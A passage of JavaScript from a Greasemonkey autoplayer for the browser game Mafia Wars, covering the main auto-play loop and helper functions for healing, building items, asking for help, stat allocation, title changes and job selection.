  if (running && !maxed && isGMChecked('buildWeapon') && !timeLeftGM('buildWeaponTimer')) {
    if (buildItem(cityWeapons, GM_getValue('buildWeaponId',1), 12)) return;
  }
  // Player updates
  if (running && !maxed && isGMChecked('logPlayerUpdates') && onHome()) {
    if (autoPlayerUpdates()) return;
  }

  // auto-heal area
//  DEBUG('  entering auto-heal ') ;
  if (running &&
      health < maxHealth &&
      isGMChecked('autoHeal') &&
      health < GM_getValue('healthLevel', 0) &&
      (stamina >= GM_getValue('stamina_min_heal')) &&
      canForceHeal()
      ) {
//    DEBUG('auto-heal passed main block check, checking can auto heal ');
    if(canautoheal()) {
      DEBUG('auto-healing '); // hide/remove after testing
      if (isGMChecked('quickHeal')) {
        if(quickHeal(false)) return;
      } else {
        if(autoHeal()) return;
      }
    }
  } else {
// hide/remove after testing
//    DEBUG(' autoheal skipped in main loop ');
    DEBUG('heal skipped, actual stamina:' + stamina +' stamina_Min_heal:'+ GM_getValue('stamina_min_heal') +  ' force heal:' + canForceHeal() );
    DEBUG('heal skipped, current health:' + health + ' full:' + maxHealth + ' heal when health falls below:' + GM_getValue('healthLevel', 0) );
  }

//  DEBUG('after auto-heal  - - X ');

  // Re-activating autoHeal in case you died and PS MWAP cleared the playerupdates before it could parse the snuffed message:
  if (running && health == 0 && !isGMChecked('autoHeal') && isGMChecked('logPlayerUpdates') && isGMChecked('hideAttacks')) {
    DEBUG('Re-activating autoHeal, seems you died while clearing the playerupdates!<br>Current HitXP: ' + GM_getValue('currentHitXp', 0));
    GM_setValue('autoHeal', 'checked');
  }

  // Background mode hitlisting (limit to level 4 and above)
  if (running && !maxed && autoStaminaSpendif && isGMChecked('bgAutoHitCheck') && !timeLeftGM('bgAutoHitTime')){
    if(autoHitlist()) return;
  }

  // Ask for Help on Moscow Tier
  if (running && !maxed && parseInt(GM_getValue('selectMoscowTier'))  && !timeLeftGM('AskforHelpMoscowTimer')) {
    DEBUG('going to Moscow for Ask for Help-job');
    if (AskforHelp('2')) return;
  }

  // Ask for Help on Bangkok Tier
  if (running && !maxed && parseInt(GM_getValue('selectBangkokTier')) && !timeLeftGM('AskforHelpBangkokTimer')) {
    DEBUG('going to Bangkok for Ask for Help-job');
    if (AskforHelp('3')) return;
  }

  // Auto-stat
  if (running && !maxed && stats > 0 && isGMChecked('autoStat') && !parseInt(GM_getValue('restAutoStat')) ) {
    if (autoStat()) return;
  }

  // Auto-lotto (limit to level 7 and above)
  if (running && !maxed && isGMChecked('autoLottoOpt') && hasMarket) {
    if (autoLotto()) return;
  }

  // Auto-war (limit to level 4 and above)
  if (running && !maxed && isGMChecked('autoWar') && hasFight) {
    if (autoWar()) return;
  }

  // Auto-accept
  if (running && !maxed && invites > 0 && isGMChecked('acceptMafiaInvitations')) {
    if (autoAccept()) return;
  }

  // Auto-giftwaiting (limit to level 6 and above)
  if (running && !maxed && isGMChecked('autoGiftWaiting') && hasHome) {
    if (autoGiftWaiting()) return;
  }

  // Auto-dailychecklist
  if (running && !maxed && isGMChecked('autoDailyChecklist') && hasHome) {
    if (autoDailyChecklist()) return;
  }

  // Auto-Enforce title
  if (running && !maxed && GM_getValue('autoEnforcedTitle')!='' && !timeLeftGM('autoEnforcedTitleTimer')) {
    if (autoEnforce()) return;
  }

  // Auto-GiftAccept
  if (running && !maxed && isGMChecked('autoGiftAccept') && hasHome) {
    if (autoGiftQueue()) return;
    if (autoGiftAccept()) return;
  }

  // Auto-Safehouse (aka Crime Spree now)
  if (running && !maxed && isGMChecked('autoSafehouse') && hasHome) {
    if (autoSafehouse()) return;
  }

  // Mini-pack check
  var xpPtsFromEnergy = (energy + 200) * getEnergyGainRate();
  var xpPtsFromStamina = (stamina + 200) * getStaminaGainRate();
  var canUseMiniPack = (xpPtsFromEnergy < ptsToNextLevel) && (xpPtsFromStamina < ptsToNextLevel);
  if (running && !maxed && canUseMiniPack && isGMChecked('checkMiniPack') && !timeLeftGM('miniPackTimer')) {
    if (miniPack()) return;
  }

  // Auto-energypack
  energyPackElt = xpathFirst('.//a[contains(@onclick, "xw_action=use_and_energy_all")]', innerPageElt);
  energyPackElt = energyPackElt ? energyPackElt : xpathFirst('.//a[contains(@onclick, "xw_action=use_energy_pak")]', innerPageElt);
  energyPack = (energyPackElt && onHome()) ? true : false;
  var energyCountdownElt = xpathFirst('.//div[contains(@id, "mbox_energy_timer_container")]', innerPageElt);
  if (energyCountdownElt) {
    if (energyCountdownElt.style.display == 'block') {
      energyPack = false;
    }
  }
  var ptsFromEnergyPack = maxEnergy * 1.25 * getEnergyGainRate();
  var ptsToLevelProjStaminaUse = ptsToNextLevel - stamina*getStaminaGainRate();
  var autoEnergyPackWaiting = running && energyPack &&
                              ptsFromEnergyPack <= ptsToLevelProjStaminaUse &&
                              isGMChecked('autoEnergyPack');

  if ((autoEnergyPackWaiting && (energy <= 2)) || (energyPack && isGMChecked('autoEnergyPackForce') && (energy <= GM_getValue('autoEnergyPackForcePts',0)))) {
    DEBUG('energyPack='+energyPack+'  energy='+energy+ '  ptsToNextLevel=' + ptsToNextLevel +
          '  ptsToLevelProjStaminaUse=' + ptsToLevelProjStaminaUse);
    if (autoEnergyPackWaiting) {
      addToLog('energyPack Icon', 'This energy pack should give you approximately ' + parseInt(ptsFromEnergyPack) + ' xp of your ' + parseInt(ptsToLevelProjStaminaUse) + ' projected remaining xp.' );
    }
    if (!energyPackElt){
      DEBUG('Cant find energy pack to click');
    } else {
      Autoplay.fx = function() {
        clickAction = 'energypack';
        clickElement(energyPackElt);
        DEBUG('Clicked to use energy pack');
      };
      Autoplay.start();
      return;
    }
  }

  // Do jobs or fight/hit. Give priority to spending stamina if it needs
  // to be burned and using one won't level up. Give priority to jobs if
  // within one stamina of leveling, or if an energy pack is waiting, or
  // if energy is fuller than stamina (in percentage terms)
  // Prioritize burning of energy if level-up within reach.
  if ((autoMissionif && SpendEnergy.canBurn) || (autoMissionif &&
       !(autoStaminaSpendif && SpendStamina.canBurn && ptsToNextLevel > 6) &&
       (ptsToNextLevel <= 6 || autoEnergyPackWaiting || energy/maxEnergy >= stamina/maxStamina))) {
    autoMission();
    return;
  }
  if (autoStaminaSpendif) {
    if (autoStaminaSpend()) return;  // staminaspend is unchecked comes back false

    // Attempt failed. Randomize stamina setting (if set)
    if (isGMEqual('staminaSpendHow', STAMINA_HOW_RANDOM)) {
      randomizeStamina();
      if (autoStaminaSpend()) return;

    // Attempt failed. Let some other action happen before trying again
    } else {
      skipStaminaSpend = true;
    }
  }
  if (autoMissionif) {
    autoMission();
    return;
  }

  // Auto-upgrade properties (limit to level 4 and above, skip if flash is enabled)
  // If isFlashed==FLASH_UNDEFINED it will enter the properties once, after that, isFlashed is either FLASHED_ENABLED or FLASHED_DISABLED
  if (running && isGMChecked('autoBuy') && hasProps && (isFlashed!=FLASH_ENABLED)) {
    for (var i = 0, iLength = cities.length; i < iLength; ++i) {
      if (i != LV && level >= cities[i][CITY_LEVEL]) {
        // Upgrade properties
        if (upgradeProps(i)) return;
      }
    }
  }

  // If we reach this point, the script is considered to be idle. Anything the
  // script might do when there is nothing else to do should go below here.
  idle = true;

  // If not previously idle, check the home page.
  if (running && !previouslyIdle) {
    DEBUG('Now idle. Checking the home page.');
    Autoplay.fx = goHome;
    Autoplay.start();
    return;
  }

  // If fight/hit/jobs are being skipped, turn them back on and go to the home page
  if (running && (skipStaminaSpend || skipJobs)) {
    skipStaminaSpend = false;
    skipJobs = false;
    Autoplay.start();
    return;
  }

  // Idle in preferred city
  if (running && idle && isGMChecked('idleInCity') && city != GM_getValue('idleLocation', NY)) {
    DEBUG('Idling. Moving to ' + cities[GM_getValue('idleLocation', NY)][CITY_NAME] + '. ');
    Autoplay.fx = function(){goLocation(GM_getValue('idleLocation',NY));};
    Autoplay.start();
    return;
  }

  // Use the reload animate obj to kick off autoplay again
  autoReload(true);
}
////////////////////////////////////////////// end of do auto play ///////////////////////////////////

function canautoheal() {
// DEBUG('in can auto heal - - 2 ');
  if(GM_getValue('staminaSpendHow') == STAMINA_HOW_FIGHTROB) {
    DEBUG(' STAMINA_HOW_FIGHTROB  blocked autoheal ');
    return false;
  }
  if((GM_getValue('staminaSpendHow') == STAMINA_HOW_ROBBING) && (isGMChecked('BlockHealRobbing')) )  {
    DEBUG(' STAMINA_HOW_ROBBING blocked autoheal ');
    return false;
  }

//  DEBUG('canautoheal is allowing healing ');
  return true;
}

function getAutoPlayDelay() {
  return Math.floor(parseFloat(GM_getValue('d1', '3')) +
         parseFloat((GM_getValue('d2', '5')) -
         parseFloat(GM_getValue('d1', '3')))*Math.random())*1000;
}

function autoReload(forceReload) {
  if (forceReload || isGMChecked('autoClick')) {
    Reload.fx    = function() {
      // Try the "nice" way first, but reload completely if that doesn't work.
      DEBUG('forced Page Reload');
      goHome();
      Reload.fx = loadHome;
      Reload.delay = 10000;
      Reload.start();
    };
    Reload.delay = Math.floor(parseFloat(GM_getValue('r1', '30')) +
                   parseFloat((GM_getValue('r2', '110')) -
                   parseFloat(GM_getValue('r1', '30')))*Math.random())*1000;
    Reload.start();
  }
}

function autoAccept() {
  // Load My Mafia
  if (!onMyMafiaNav()) {
    Autoplay.fx = goMyMafiaNav;
    Autoplay.start();
    return true;
  }

  // Get the "accept all" link.
  var elt = xpathFirst('.//a[contains(., "accept all")]', innerPageElt);
  if (!elt) {
    DEBUG('Can\'t find accept link to click.');
    return true;
  } else {
    // Get the ajax link from the profile element
    var eltProfile = xpathFirst('//div[@class="nav_link profile_link"]//a[contains(.,"Profile")]');
    if (eltProfile) {
      elt.setAttribute('onclick',eltProfile.getAttribute('onclick')
        .replace(/xw_controller=stats/i,'xw_controller=recruit')
        .replace(/xw_action=view/i,'xw_action=accept&user_id=all&skip_req_frame=1')
      );
    }
  }

  // Accept all invitations.
  Autoplay.fx = function() {
    clickAction = 'accept';
    clickElement(elt);
    DEBUG('Clicked to accept.');
  };
  Autoplay.start();
  return true;
}

function autoHeal() {
  // NOTE: In the interest of time, delays are waived.
  Autoplay.delay = noDelay;
  // Make sure we're in the preferred city.
  var healLocation = parseInt(GM_getValue('healLocation', NY));
  if (healLocation != cities.length && city != healLocation) {
    Autoplay.fx = function() { goLocation(healLocation); };
    Autoplay.start();
    return true;
  }
  // Check if hospitalpopup is visible and healbutton is present.
  var healElt = xpathFirst('.//div[@class="hospital_pop" and not(contains(@style,"none"))]/div[@class="pop_box" and not(contains(@style,"none"))]//a[contains(@onclick,"xw_action=heal")]', popupfodderElt);
  // If not, go to hospital manually
  if (!healElt) {
    // Go to the hospital.
    var hospitalElt = xpathFirst('.//div[@id="clock_health" and not(contains(@style,"none"))]//a[@class="heal_link" or @class="heal_link vt-p"]', statsrowElt);
    if (!hospitalElt) hospitalElt = xpathFirst('.//div[@id="clock_health" and not(contains(@style,"none"))]/a', statsrowElt);
    if (hospitalElt) {
      Autoplay.fx = function() {
        clickElement(hospitalElt);
        DEBUG('Clicked to go to hospital.');
      };
      Autoplay.start();
      return true;
    } else {
      addToLog('warning Icon', 'WARNING: Can\'t find hospital link.');
      return false;
    }
  }

  // Found a heal link. Click it.
  Autoplay.fx = function() {
    clickAction = 'heal';
    clickElement(healElt);
    DEBUG('Clicked to heal.');
  };
  Autoplay.start();
  return true;
}

function AskforHelp(hlpCity) {
  // Common function if job has failed
  var doAskFunction = function (askResult) {
    if (!askResult) {
      addToLog('warning Icon', 'Unable to Ask for Help on ' + helpCity +'.'+ tabno+'. Please Check your \'Ask for Help\'-settings on PS MWAP\'s Mafia tab.');
      if(helpCity==2) GM_setValue('selectMoscowTier', 0);
      if(helpCity==3) GM_setValue('selectBangkokTier', 0);
    }
  };

  var helpCity = parseInt(hlpCity);
  var tabno=0;
  var timerName='';

  if(helpCity==2) {
    DEBUG('Clicking to go to Moscow to look for Ask for Help-job');
    tabno = parseInt(GM_getValue('selectMoscowTier'));
    timerName='AskforHelpMoscowTimer';
  }
  if(helpCity==3) {
    DEBUG('Clicking to go to Bangkok to look for Ask for Help-job');
    tabno = parseInt(GM_getValue('selectBangkokTier'));
    timerName='AskforHelpBangkokTimer';
  }

  // Go to the correct city.
  if (city != helpCity) {
    Autoplay.fx = function() { goLocation(helpCity); };
    //Autoplay.delay = noDelay;
    Autoplay.start();
    return true;
  }

  // Go to the correct job tab.
  if (!onJobTab(tabno)) {
    Autoplay.fx = function() { doAskFunction(goJobTab(tabno)); };
    Autoplay.start();
    return true;
  }

  if (/You must wait 24 hours/i.test(innerPageElt.innerHTML)) {
    setGMTime(timerName, '2 hour');
    addToLog('warning Icon', ' You must wait 24 hours before you can ask for help again on ' + helpCity +'.'+ tabno);
    DEBUG('Link for Asking says Wait for 24 hours ... Resetting Timer for 2h on ' + helpCity +'.'+ tabno);
  } else {
    var askHelpFriends = xpathFirst('.//a[contains(., "Ask for Help")]', innerPageElt);
    DEBUG(askHelpFriends);

    if (askHelpFriends) {
      addToLog('info Icon', ' Clicked to Ask for Help on ' + helpCity +'.'+ tabno);
      clickElement(askHelpFriends);
      DEBUG(' Clicked to Ask for Help on ' + helpCity +'.'+ tabno);
      setGMTime(timerName, '12 hours');
    return true;
    } else {
      setGMTime(timerName, '1 hour');
      addToLog('info Icon', ' You cannot Ask for Help yet on ' + helpCity +'.'+ tabno);
      DEBUG('Link for Asking for Help not found ... Resetting Timer for 1h on ' + helpCity +'.'+ tabno);
  }
  }
  return;
}

// Pass the item array, item id, and building type
function buildItem(itemArray, itemIndex, buildType){
  if (city != NY) {
    Autoplay.fx = function() { goLocation(NY); };
    //Autoplay.delay = noDelay;
    Autoplay.start();
    return true;
  }

  // Build the clickable element
  var elt = makeElement('a', null, {'onclick':'return do_ajax("inner_page",'+
                        '"remote/html_server.php?xw_controller=propertyV2&' +
                        'xw_action=craft&xw_city=1&recipe='+itemArray[itemIndex][1]+'&building_type='+buildType+'", 1, 1, 0, 0); return false;'});

  if (elt) {
    Autoplay.fx = function() {
      clickAction = 'build item';
      clickContext = {'itemName': itemArray[itemIndex][0], 'buildType': buildType};
      clickElement(elt);
      DEBUG('Clicked to build ' + clickContext.itemName + '.');
    };

    Autoplay.start();
    return true;
  }
  return false;
}

function checkVaultStatus(byUser) {
  if (byUser == false && timeLeftGM('checkVaultTimer')) return;
  DEBUG('Checking vault status..')
  // Handle JSON response
  createAjaxPage(false, 'check vault');
  var elt = makeElement('a', null, {'onclick':'return do_ajax("' + SCRIPT.ajaxResult + '","' + SCRIPT.controller + 'propertyV2' + SCRIPT.action + 'createData' + SCRIPT.city + '5&city=5", 1, 1, 0, 0); return false;'});
  clickElement(elt);
  return;
}

function autoCollectTake(takeCity) {
  // Go to the correct city.
  if (city != takeCity) {
    Autoplay.fx = function(){goLocation(takeCity);};
    Autoplay.start();
    return true;
  }

  // Visit the property Nav
  if (!onPropertyNav()) {
    Autoplay.fx = goPropertyNav;
    Autoplay.start();
    return true;
  }

  createAjaxPage(true);
  var elt = makeElement('a', null, {'onclick':'return do_ajax("' + SCRIPT.ajaxPage + '","' + SCRIPT.controller + 'propertyV2' + SCRIPT.action + 'collectall' + SCRIPT.city + (takeCity+1) + '&requesttype=json", 1, 1, 0, 0); return false;'});
  Autoplay.fx = function() {
    clickAction = 'collect take';
    clickContext = takeCity;
    clickElement(elt);
  };
  Autoplay.delay = getAutoPlayDelay();
  Autoplay.start();
  return true;
}

function autoPlayerUpdates() {
  // Get the updates.
  var pUpdates = xpath('.//div[@class="update_item"]', innerPageElt);
  var pUpdatesLen = pUpdates.snapshotLength;
  var logPlayerUpdatesCount = GM_getValue('logPlayerUpdatesCount');
  if (isUndefined(logPlayerUpdatesCount)) {
    // The settings must have been cleared. Assume all updates were read.
    logPlayerUpdatesCount = pUpdatesLen;
    GM_setValue('logPlayerUpdatesCount', logPlayerUpdatesCount);
  }

  if ((pUpdatesLen > 0 && logPlayerUpdatesCount > pUpdatesLen) ||
      (pUpdatesLen == 0 && logPlayerUpdatesCount > 0)) {
    if (pUpdatesLen > 0 && logPlayerUpdatesCount > pUpdatesLen) // Last time checked there were more updates than now, perhaps mw deleted old updates?
      DEBUG('Discrepancy in player updates; new count: ' + pUpdatesLen + ', old count: ' + logPlayerUpdatesCount);
    else  // Player updates have been cleared.
      DEBUG('Player updates were cleared.');
    logPlayerUpdatesCount = 0;
    GM_setValue('logPlayerUpdatesCount', 0);
  }

  // Process new updates.
  if (logPlayerUpdatesCount < pUpdatesLen) {
    DEBUG('Parsing new player updates.');
    for (var i = pUpdatesLen - logPlayerUpdatesCount - 1; i >= 0; i--) {
      if (!parsePlayerUpdates(pUpdates.snapshotItem(i))) return true;
      GM_setValue('logPlayerUpdatesCount', ++logPlayerUpdatesCount);
    }
  }

  // Clear the updates.
  if (pUpdatesLen > GM_getValue('logPlayerUpdatesMax', 25) &&
      logPlayerUpdatesCount == pUpdatesLen) {
    Autoplay.fx = goDeleteNews;
    Autoplay.start();
    return true;
  }

  return false;
}

// MiniPack!
function miniPack() {
  if (timeLeftGM('miniPackTimer')) return;
  miniPackForce();
}
function miniPackForce() {
 if (getHoursTime('miniPackTimer') == 0)
  setGMTime('miniPackTimer', '8 hours');
  DEBUG('Redirecting to force mini Energy');
  window.location.replace('http://toolbar.zynga.com/click.php?to=mwgamestatsplaynow');
}

function autoStat() {
  // Load profile
  if (!onProfileNav() || isUndefined(curAttack)) {
    Autoplay.fx = goMyProfile;
    Autoplay.start();
    return true;
  }

  if (onProfileNav()) {
    // Array containers for status settings
    var curStats = [curAttack,curDefense,maxHealth,maxEnergy,maxStamina];
    var modeStats = [level,curAttack,curDefense,maxHealth,maxEnergy,maxStamina];
    var statFallbacks = new Array(curStats.length);

    var maxPtDiff = 0;
    var statIndex = 0;
    var statPrio = autoStatPrios.length;
    for (var i = 0, iLength = curStats.length; i < iLength; ++i) {
      // Calculate the Points needed to reach target stat
      var ratio = new Number(GM_getValue(autoStatRatios[i]));
      var base = new Number(GM_getValue(autoStatBases[i]));
      var curStatPrio = new Number(GM_getValue(autoStatPrios[i]));
      var curStatDiff = Math.max (0, ratio * modeStats[GM_getValue(autoStatModes[i])] + base - curStats[i]);

      // Account for priority
      if ((curStatDiff > 0 && curStatPrio < statPrio) || (curStatDiff > maxPtDiff && curStatPrio <= statPrio)) {
        maxPtDiff = curStatDiff;
        statIndex = i;
        statPrio = curStatPrio;
      }

      // Fallback method
      statFallbacks[i] = isGMChecked(autoStatFallbacks[i]) ? i : '';
    }

    // Disable auto-stat when status goals are reached and autoStatDisable is checked
    if (maxPtDiff <= 0 && isGMChecked('autoStatDisable')) {
      addToLog('info Icon', 'All status goals met, please update your goals.');
      GM_setValue('autoStat', 0);
      return false;
    }

    // Increment the status corresponding to the nextStat variable (fallback)
    if (maxPtDiff <= 0) {
      if (statFallbacks.join('') != '') {
        DEBUG('Status GOALS reached, using fallback method.');
        var nextStat = parseInt(GM_getValue('nextStat', ATTACK_STAT));

        // Search for next Stat to increment
        while (statFallbacks.indexOf(nextStat) == -1)
          nextStat = (nextStat + 1) % curStats.length;

        DEBUG('Next stat in fallback mode: ' + autoStatDescrips[nextStat + 1]);
        statIndex = nextStat;
      } else {
        // Do not call autoStat until next level Up
        DEBUG('Status GOALS reached, waiting till next level up.');
        GM_setValue('restAutoStat', 1);
        return false;
      }
    } else {
      DEBUG('Next stat to increment : ' + autoStatDescrips[statIndex + 1] + ' (' + maxPtDiff + ' points to goal) ');
      GM_setValue('restAutoStat', 0);
    }

    // Add stats to the attribute farthest from the goal
    // (or the nextStat if fallback kicked in)
    var upgradeKey;
    switch (statIndex) {
      case ATTACK_STAT    : upgradeKey = 'attack';        break;
      case DEFENSE_STAT   : upgradeKey = 'defense';       break;
      case HEALTH_STAT    : upgradeKey = 'max_health';    break;
      case ENERGY_STAT    : upgradeKey = 'max_energy';    break;
      case STAMINA_STAT   : upgradeKey = 'max_stamina';   break;

      default             :
        // Disable auto-stats when maxPts calculated is NaN
        GM_setValue('autoStat', 0);
        addToLog('warning Icon', 'BUG DETECTED: Invalid calculated maxPts value "' + maxPts + '". Auto-stat disabled.');
        return false;
    }

    var upgradeAmt = (stats > 4 && (maxPtDiff > 4 || maxPtDiff <= 0))? 5 : 1;
    var upgradeElt = xpathFirst('.//a[contains(@onclick,"upgrade_key='+upgradeKey+'") and contains(@onclick,"upgrade_amt='+upgradeAmt+'")]', innerPageElt);

    // Try to fallback to 1 skill point button
    if (!upgradeElt){
      upgradeElt = xpathFirst('.//a[contains(@onclick,"upgrade_key='+upgradeKey+'")]', innerPageElt);
    }

    if (!upgradeElt){
      DEBUG('Couldnt find link to upgrade stat.');
      return false;
    }

    // Use click simulation
    Autoplay.fx = function() {
      clickAction = 'stats';
      clickElement(upgradeElt);
      DEBUG('Clicked to upgrade: ' + autoStatDescrips[statIndex + 1]);
    };
    Autoplay.start();
    return true;
  } else {
    // Disable auto-stats when profile page cannot be loaded
    GM_setValue('autoStat', 0);
    addToLog('warning Icon', 'BUG DETECTED: Unable to load Profile page, autostat disabled.');
    return false;
  }
}

function autoEnforce() {
  // Load profile
  if (!onProfileNav()) {
    Autoplay.fx = goMyProfile;
    Autoplay.start();
    return true;
  }

  var titleChange=0;
  var oldindex=0;
  var newindex=0;
  var logtxt="";

  if (onProfileNav()) {
    var selectElt = xpathFirst('.//select[@name="title"]', innerPageElt);
    if(!selectElt){
      DEBUG('selectElt NOT found');
    } else {
      oldindex = selectElt.selectedIndex;
      DEBUG('Current Selection :'+oldindex+' - '+ selectElt[oldindex].text+' trying to change to' + GM_getValue('autoEnforcedTitle'));
      if(selectElt[oldindex].text != GM_getValue('autoEnforcedTitle') ){
        for(newindex = 0; newindex < selectElt.length; ++newindex) {
          DEBUG(selectElt[newindex].text);
          if(selectElt[newindex].text == GM_getValue('autoEnforcedTitle')) {
            selectElt.selectedIndex = newindex;
            DEBUG('Title set to :'+selectElt[newindex].text);
            titleChange=1;
          }
        }
      } else {
        logtxt +='MW title already set to '+ GM_getValue('autoEnforcedTitle')+'. ';
        titleChange=2;
      }

      if(titleChange==1){
        var clickElt = xpathFirst('.//input[@type="submit" and contains(@value,"Change Title")]', innerPageElt);
        if(clickElt) {
          DEBUG('clickElt found');
          clickElement(clickElt);
          DEBUG('Clicked to Change Title to '+ GM_getValue('autoEnforcedTitle'));
          logtxt +='MW title changed to '+ GM_getValue('autoEnforcedTitle')+'. ';
        } else {
          DEBUG('clickElt not found');
          logtxt +='MW title not changed - Click Button not Found. ';
        }
      } else if(titleChange==0) {
        logtxt +='Invalid MW Title or No change Needed : Title not changed. ';
      }
    }

  } else {
    addToLog('warning Icon','BUG DETECTED: Unable to load Profile page.');
  }

  var autoEnforceTime = parseFloat(GM_getValue('autoEnforcedTitleTime', '1'));
  if(autoEnforceTime == 1)
    setGMTime('autoEnforcedTitleTimer', '1 hour');
  else
    setGMTime('autoEnforcedTitleTimer', autoEnforceTime + ' hours');
  logtxt += 'Trying again in '+autoEnforceTime+' hour(s).'
  addToLog('info Icon', logtxt);
  return;

}

// Get reward to cost ratio:
function calcJobratio(job) {
  var ratio = Math.round(missions[job][MISSION_XP] / missions[job][MISSION_ENERGY] * 100) / 100;
  return isNaN(ratio) ? 0 : ratio;
}

// Retreive if and how much energy can be salvaged for the next level (eg after spending an energy pack)
function canSalvageEnergy(job) {
  if (energy <= maxEnergy) return false;
  var amount = energy - (Math.ceil((ptsToNextLevel) / missions[job][MISSION_XP]) * missions[job][MISSION_ENERGY]) - maxEnergy;
  if (amount > 0) return amount;
  else return false;
}

function canMission() {
  if (!isGMChecked('autoMission')) return false;

  var i, job;
  if (isGMChecked('multipleJobs') &&
      getSavedList('jobsToDo').length == 0) {

    var availableJobs = eval('(' + GM_getValue('availableJobs', '({0:{},1:{},2:{},3:{},4:{}})') + ')');
    var masteredJobs = eval('(' + GM_getValue('masteredJobs', '({0:{},1:{},2:{},3:{},4:{}})') + ')');
    var expLeft = ptsToNextLevel;
    var ratio = Math.ceil(expLeft / energy * 100) / 100;
    var multiple_jobs_list = getSavedList('selectMissionMultiple');
    var multiple_jobs_ratio_sorted = [];
    var jobs_selection = [];
    var singleJobLevelUp = [];
    var enoughEnergy = false;
    var canSalvage = false;

    // mission mastery code
    var mastery_jobs_list = getSavedList('masteryJobsList');
    for (i = 0, iLength=mastery_jobs_list.length; i < iLength; ++i) {
      // Filters jobs on the ignorelist
      job = mastery_jobs_list[i];

      // Only push jobs that does not exist on the main list
      if (multiple_jobs_list.indexOf(job) == -1)
        multiple_jobs_list.push(job);
    }

    for (i = 0, iLength= multiple_jobs_list.length; i < iLength; ++i) {
      job = multiple_jobs_list[i];
      var mission = missions[job];
      if(!mission) continue;
      // This should enable us to use mastery jobs for single job level ups
      var singleJobLevelUpPossible = false;

      // Ignore jobs that are not yet available
      if (availableJobs[mission[MISSION_CITY]][mission[MISSION_TAB]] != null &&
         availableJobs[mission[MISSION_CITY]][mission[MISSION_TAB]].indexOf(parseInt(job)) == -1) {
        continue;
      }

      // Determine the job's experience-to-energy ratio.
      if (isNaN(mission[MISSION_RATIO])) mission[MISSION_RATIO] = calcJobratio(job);
      if (mission[MISSION_ENERGY] <= energy) {
        enoughEnergy = true;
        if (mission[MISSION_XP] >= expLeft) {
          var levelJob = [job, mission[MISSION_ENERGY], mission[MISSION_XP]];
          singleJobLevelUp.push(levelJob);
          singleJobLevelUpPossible = true;
        }
      }

      // Ignore mastered jobs unless it can do a single job level up
      if (masteredJobs[mission[MISSION_CITY]][mission[MISSION_TAB]] != null &&
          masteredJobs[mission[MISSION_CITY]][mission[MISSION_TAB]].indexOf(parseInt(job)) != -1 &&
          singleJobLevelUpPossible == false) {
        continue;
      }

      // Can salvage energy with this job
      if (!canSalvage && canSalvageEnergy(job)) canSalvage = true;
      multiple_jobs_ratio_sorted.push(job);
    }

    if (!enoughEnergy) return false;

    var doJob;
    multiple_jobs_ratio_sorted.sort(function(a, b) { return missions[b][MISSION_RATIO] - missions[a][MISSION_RATIO]; });

    // Don't do expBurners or biggest exp job if energy can be salvaged
    if (singleJobLevelUp.length > 0 && !canSalvage) {
      singleJobLevelUp.sort(function(a, b) { return b[2] - a[2]; });
      // One job is enough to level up. Pick the one that pays the most.
      doJob = singleJobLevelUp[0][0];

      if (isGMChecked('endLevelOptimize')) {
        // Get the exp burner from the missions array
        var expBurnFilter = function(v, i, a) { return (i > 6 && i < singleJobLevelUp[0][0] &&
                                                        a[i][6] < 2 &&
                                                        a[i][1] < singleJobLevelUp[0][1] * 0.5) ? 1:0; };
        var expBurners = missions.filter(expBurnFilter);
        expBurners.sort(function(a, b) { return b[5] - a[5]; });

        // Burn up exp before leveling up to maximize energy
        for (var i = 0, iLength=expBurners.length; i < iLength; ++i) {
          var expBurner = expBurners[i];
          if ( (energy - singleJobLevelUp[0][1]) > expBurner[1] &&
             expLeft >= Math.floor(expBurner[5]) * 1.5) {
            doJob = missions.searchArray(expBurner[0], 0)[0];
            jobOptimizeOn = true;
            break;
          }
        }
      }
    } else {
      // Can't level up. Pick a job we can do whose ratio is high enough.
      for (i = 0; i < multiple_jobs_ratio_sorted.length; i++) {
        if (energy >= missions[multiple_jobs_ratio_sorted[i]][MISSION_ENERGY] &&
            ratio <= missions[multiple_jobs_ratio_sorted[i]][MISSION_RATIO]) {
          jobs_selection.push(multiple_jobs_ratio_sorted[i]);
        }
      }
      if (jobs_selection.length == 0) {
        // No jobs meet the ratio necessary to level up. Go with the highest.
        doJob = multiple_jobs_ratio_sorted[0];
      } else {
        // Pick the one with the lowest ratio.
        if (!canSalvage) {
          doJob = jobs_selection[jobs_selection.length-1];
        // Energy can be salvaged, pick the one with the highest ratio
        } else {
          doJob = jobs_selection[0];
        }
      }
    }
    if (GM_getValue('selectMission') != doJob) {
      if (isUndefined(doJob)) {
        addToLog('info Icon', 'No jobs selected. Disabling automission.');
        GM_setValue('autoMission', 0);
        return false;
      } else {
        addToLog('info Icon', 'Switching job to ' + missions[doJob][MISSION_NAME] + '.');
        GM_setValue('selectMission', doJob);
      }
    }
  }

  if (energy < missions[GM_getValue('selectMission', 1)][MISSION_ENERGY]) {
    DEBUG('Skipping jobs: energy=' + energy + ', cost=' + missions[GM_getValue('selectMission', 1)][MISSION_ENERGY]);
    return false;
  }

  // If spending energy will set energy below Energy floor, skip jobs
  var nextJobEnergy =  missions[GM_getValue('selectMission', 1)][MISSION_ENERGY];
  if (energy - nextJobEnergy < SpendEnergy.floor && !SpendEnergy.canBurn) {
    DEBUG('Not spending energy: energy=' + energy +
          ', floor=' + SpendEnergy.floor +
          ', nextJobEnergy=' + nextJobEnergy +
          ', burn=' + SpendEnergy.canBurn);
    return false;
  }

  if (energy < SpendEnergy.ceiling && !SpendEnergy.canBurn &&
      !GM_getValue('useEnergyStarted')) {
    DEBUG('Rebuilding energy: energy=' + energy +
          ', ceiling=' + SpendEnergy.ceiling + ', burn=' + SpendEnergy.canBurn);
    return false;
  }

  return true;
}

function autoMission() {
  var jobid       = GM_getValue('selectMission', 1);
  var jobName     = missions[jobid][MISSION_NAME];
  var jobno       = missions[jobid][MISSION_NUMBER];
  var tabno       = missions[jobid][MISSION_TAB];
  var cityno      = missions[jobid][MISSION_CITY];
  var tabnopath   = missions[jobid][MISSION_TABPATH];
  var nodelv      = missions[jobid][MISSION_NODE_LV];

//newlv
  if (!tabnopath) var tabnopath = 0 ;
  if (!nodelv)    var nodelv    = ''  ;
  DEBUG('autoMission = ' + jobid + ' ' + jobName + ' ' + jobno + ' ' + tabno + ' ' + cityno + ' tabnopath ' + tabnopath );

  if (SpendEnergy.floor &&
      isGMChecked('allowEnergyToLevelUp') &&
      GM_getValue('autoEnergyBurn') !== SpendEnergy.canBurn) {
    GM_setValue('autoEnergyBurn', SpendEnergy.canBurn);
    if (SpendEnergy.canBurn) {
